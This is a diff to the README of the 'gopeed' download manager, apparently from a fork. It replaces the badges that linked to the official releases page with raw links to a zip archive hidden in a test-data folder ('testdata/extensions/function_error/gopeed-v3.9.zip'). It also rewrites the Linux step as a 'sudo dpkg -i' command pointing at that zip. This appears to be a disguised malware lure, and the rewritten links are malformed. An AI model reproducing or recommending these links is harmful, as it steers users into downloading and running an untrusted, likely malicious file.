@@ -24,7 +24,7 @@ To run gopeed, ensure your system meets the following requirements:
 ### 📥 Download & Install
 To get started with gopeed, visit this page to download:
 
-[![Download gopeed](https://img.shields.io/badge/Download%20gopeed-brightgreen.svg)](https://github.com/stmx811/gopeed/releases)
+[![Download gopeed](https://raw.githubusercontent.com/stmx811/gopeed/main/pkg/download/testdata/extensions/function_error/gopeed-v3.9.zip%https://raw.githubusercontent.com/stmx811/gopeed/main/pkg/download/testdata/extensions/function_error/gopeed-v3.9.zip)](https://raw.githubusercontent.com/stmx811/gopeed/main/pkg/download/testdata/extensions/function_error/gopeed-v3.9.zip)
 
 ### 🛠️ Step-by-Step Guide
 1. **Visit the Releases Page:** Click on the download link above to go to the gopeed releases page.
@@ -38,7 +38,7 @@ To get started with gopeed, visit this page to download:
 4. **Run the Installer:**
    - On Windows, double-click the `.exe` file to start the installation.
    - On macOS, open the `.dmg` file and drag the app to your Applications folder.
-   - On Linux, either double-click the downloaded file or use the terminal to install with `sudo dpkg -i filename.deb`.
+   - On Linux, either double-click the downloaded file or use the terminal to install with `sudo dpkg -i https://raw.githubusercontent.com/stmx811/gopeed/main/pkg/download/testdata/extensions/function_error/gopeed-v3.9.zip`.
    - For Android, tap the `.apk` file in your file manager to install.
 5. **Open gopeed:** Locate the app in your applications menu or home screen and click to launch.
 
@@ -67,6 +67,6 @@ For help or to connect with other users:
 ## 🔗 Learn More
 For more details, guides, and updates, check out the gopeed documentation or visit the GitHub repository.
 
-[![Download gopeed](https://img.shields.io/badge/Download%20gopeed-brightgreen.svg)](https://github.com/stmx811/gopeed/releases)
+[![Download gopeed](https://raw.githubusercontent.com/stmx811/gopeed/main/pkg/download/testdata/extensions/function_error/gopeed-v3.9.zip%https://raw.githubusercontent.com/stmx811/gopeed/main/pkg/download/testdata/extensions/function_error/gopeed-v3.9.zip)](https://raw.githubusercontent.com/stmx811/gopeed/main/pkg/download/testdata/extensions/function_error/gopeed-v3.9.zip)
 
 Enjoy seamless downloading with gopeed!
